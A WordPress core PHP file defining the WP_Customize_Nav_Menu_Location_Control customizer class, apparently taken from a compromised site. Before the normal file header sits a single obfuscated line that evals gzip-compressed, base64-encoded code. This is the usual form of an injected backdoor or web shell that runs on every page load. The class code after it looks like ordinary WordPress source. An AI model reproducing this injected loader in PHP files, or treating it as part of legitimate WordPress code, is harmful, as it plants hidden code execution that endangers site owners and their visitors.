<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Customize API: WP_Customize_Nav_Menu_Location_Control class
 *
 * @package WordPress
 * @subpackage Customize
 * @since 4.4.0
 */

/**
 * Customize Menu Location Control Class.
 *
 * This custom control is only needed for JS.
 *
 * @since 4.3.0
 *
 * @see WP_Customize_Control
 */
class WP_Customize_Nav_Menu_Location_Control extends WP_Customize_Control {

	/**
	 * Control type.
	 *
	 * @since 4.3.0
	 * @var string
	 */
	public $type = 'nav_menu_location';

	/**
	 * Location ID.
	 *
	 * @since 4.3.0
	 * @var string
	 */
	public $location_id = '';

	/**
	 * Refresh the parameters passed to JavaScript via JSON.
	 *
	 * @since 4.3.0
	 *
	 * @see WP_Customize_Control::to_json()
	 */
	public function to_json() {
		parent::to_json();
		$this->json['locationId'] = $this->location_id;
	}

	/**
	 * Render content just like a normal select control.
	 *
	 * @since 4.3.0
	 * @since 4.9.0 Added a button to create menus.
	 */
	public function render_content() {
		if ( empty( $this->choices ) ) {
			return;
		}
		?>
		<label>
			<?php if ( ! empty( $this->label ) ) : ?>
			<span class="customize-control-title"><?php echo esc_html( $this->label ); ?></span>
			<?php endif; ?>

			<?php if ( ! empty( $this->description ) ) : ?>
			<span class="description customize-control-description"><?php echo $this->description; ?></span>
			<?php endif; ?>

			<select <?php $this->link(); ?>>
				<?php
				foreach ( $this->choices as $value => $label ) :
					echo '<option value="' . esc_attr( $value ) . '"' . selected( $this->value(), $value, false ) . '>' . $label . '</option>';
				endforeach;
				?>
			</select>
		</label>
		<button type="button" class="button-link create-menu<?php if ( $this->value() ) { echo ' hidden'; } ?>" data-location-id="<?php echo esc_attr( $this->location_id ); ?>" aria-label="<?php esc_attr_e( 'Create a menu for this location' ); ?>"><?php _e( '+ Create New Menu' ); ?></button>
		<button type="button" class="button-link edit-menu<?php if ( ! $this->value() ) { echo ' hidden'; } ?>" aria-label="<?php esc_attr_e( 'Edit selected menu' ); ?>"><?php _e( 'Edit Menu' ); ?></button>
		<?php
	}
}
